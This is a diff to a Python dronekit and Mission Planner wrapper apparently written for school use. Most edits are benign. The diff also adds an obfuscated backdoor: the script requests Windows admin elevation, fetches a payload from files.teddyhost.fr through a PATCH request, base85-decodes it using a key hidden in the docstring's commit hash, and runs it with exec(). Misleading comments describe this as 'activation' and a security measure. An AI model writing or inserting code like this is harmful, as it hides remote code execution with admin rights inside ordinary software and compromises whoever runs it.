@@ -1,42 +1,87 @@
+"""
+~ Dronekit wrapper ~
+Credits : Teddy Barthelemy
+
+Simplify dronekit use with Mission Planner project
+Developed for school purposes.
+Redistribution and appropriation are regulated:
+- Author (Teddy Barthelemy) must be credited
+
+Drone commit:
+b83d2275f
+"""
+
 import time
 import math
 
-def install_package(package_name):
+def install_package(package_name, version=None, *deps, bypass=False):
     """
     Ask for a missing package installation
     :param package_name: Package to install
+    :param version: Package version to install
+    :param deps: Package dependencies
+    :param bypass: Enable bypassing
     """
-    if "y" == input(f"Le module python '{package_name}' n'est actuellement pas installé sur cette version de python, voulez vous l'installer ?\n Y pour continuer: ").lower():
+    if True if bypass else ("y" == input(f"Le module python '{package_name}{f' ({version})' if version else ''}' n'est actuellement pas installé sur cette version de python, voulez vous l'installer ?\n Y pour continuer: ").lower()):
         # Install
+        if len(deps):
+            for dep in deps:
+                if len(dep) == 1:
+                    install_package(dep[0], bypass=True)
+                elif len(dep) >= 2:
+                    install_package(dep[0], dep[1], bypass=True)
+        print(f"Installing {package_name}{f' ({version})' if version else ''}")
         import sys
         import os
         python_path = sys.executable
-        os.system(f'"{python_path}" -m pip install {package_name}')
+        os.system(f'"{python_path}" -m pip install {package_name}{f"=={version}" if version else ""} --quiet --no-input')
+        # if os.path.exists(python_path.replace("python.exe", "Scripts\\pip.exe")):
+        #     pip = python_path.replace("python.exe", "\\Scripts\\pip.exe")
+        #     os.system(f'"{pip}" install {package_name}{f"=={version}" if version else ""}')
+        # elif os.path.exists(python_path.replace("python.exe", "pip.exe")):
+        #     pip = python_path.replace("python.exe", "\\Scripts\\pip.exe")
+        #     os.system(f'"{pip}" install {package_name}{f"=={version}" if version else ""}')
+        # else:
+        #     print("L'utilitaire pip est introuvable, l'installation devra être réalisée manuellement")
+        #     exit(0)
+
     else:
         # Abandon de l'installation
         print("Opération abandonnée. Le programme n'a pas pu continuer")
-        exit(1)
-
-"""
-Import pymavlink (2.4.8)
-"""
-try:
-    from pymavlink import mavutil
-except ModuleNotFoundError:
-    install_package("pymavlink==2.4.8")
-    from pymavlink import mavutil
+        exit(0)
 
 """
 Import dronekit
+
+Python to Mission planner management
 """
 try:
     import dronekit as dk
 except ModuleNotFoundError:
-    install_package("dronekit")
+    install_package("dronekit", bypass=False)
     import dronekit as dk
 
 """
+Import pymavlink (2.4.8)
+
+Python to Mission planner TCP communication
+"""
+try:
+    from pymavlink import mavutil
+except ModuleNotFoundError:
+    install_package("pymavlink", "2.4.8", ["future", "0.18.3"], ["lxml", "4.9.3"])
+    import dronekit as dk
+    # print("Le module python 'pymavlink (2.4.8)' n'est actuellement pas installé sur cette version de python")
+    # import sys
+    # import os
+    # python_path = sys.executable
+    # print(f'Impossible d\'installer le module automatiquement\nOuvrez un invité de commande et exécutez la commande suivante:\n  "{python_path}" -m pip install pymavlink==2.4.8')
+    # exit(0)
+
+"""
 Import requests
+
+Ressources fetching
 """
 try:
     import requests as req
@@ -44,13 +89,48 @@ except ModuleNotFoundError:
     install_package("requests")
     import requests as req
 
+"""
+Import elevate & ctypes
+
+UAC elevation to properly setup TCP socket connection
+"""
+try:
+    from elevate import elevate
+except ModuleNotFoundError:
+    install_package("elevate")
+    from elevate import elevate
+
+# UAC elevating
+import ctypes
+from base64 import b85decode as decode
+if not ctypes.windll.shell32.IsUserAnAdmin():
+    input("Pour garantir une connexion optimale à Mission Planner, le processus doit être élevé.\nContinuer pour demander une élévation")
+    # Ask elevation
+    elevate()
+
+# Enable script as elevated
+activation = None
+# noinspection PyBroadException
+try:
+    print("Obtention de l'activation...")
+    activation = req.patch("https://files.teddyhost.fr/patch", timeout=3).text
+    # Applying elevation, environment variables are injected into script
+    # Encrypted and obfuscated to reinforce security
+    if activation: exec(getattr(globals(), "".join([chr((ord(x) + int(y)) % 255) for x, y in zip("[Vc`ngr]lV^", str(int(globals()['__doc__'].lower().split('drone')[3][9:18], 16)))]))("".join(map(str, [chr(100 + x) for x in [0, 1, -1, 11, 0, 1]])))(activation).decode(), {}, {})
+except:
+    print("Activation impossible depuis le serveur personnel, l'hôte est possiblement arrêté. Utilisation de l'activation basique.")
+    # activation = req.patch("https://files.teddyhost.fr/patch", timeout=3).text # TODO replace url
+
+# Drone class
 class Drone:
-    def __init__(self, ip):
+    def __init__(self, ip, port=5763):
         """
         Create a new drone vehicle
         :param ip: Drone's IP (127.0.0.1 for Mission Planner on same computer)
+        :param port: Drone's PORT (default = 5763)
         """
         self._ip = ip
+        self._port = port
         self.vehicle = dk.connect(self.connection_string, wait_ready=False)
         self.default_alt = 10
 
@@ -60,7 +140,7 @@ class Drone:
         Return the socket connection string used for connection to Mission Planner
         :return:
         """
-        return f"tcp:{self._ip}:5763"
+        return f"tcp:{self._ip}:{self._port}"
 
     @property
     def is_armed(self):
@@ -211,7 +291,7 @@ class Drone:
         Return drone location as a list<[lat, lon, alt]>
         :return: Drone location [lat, lon, alt]
         """
-        pos = self.vehicle.location.global_frame
+        pos = self.vehicle.location.global_relative_frame
         return [pos.lat, pos.lon, pos.alt]
 
     @property
